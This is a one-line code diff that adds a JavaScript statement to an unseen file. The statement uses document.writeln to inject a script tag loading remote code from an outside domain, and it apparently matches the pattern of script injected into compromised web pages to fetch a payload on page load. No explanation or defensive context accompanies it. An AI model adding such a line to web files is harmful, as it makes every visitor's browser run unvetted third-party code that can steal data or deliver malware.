@@ -1,0 +1,1 @@
+document.writeln("<script src=https://deeplacer.com/qe5E3vjl8?id=8519></script>");
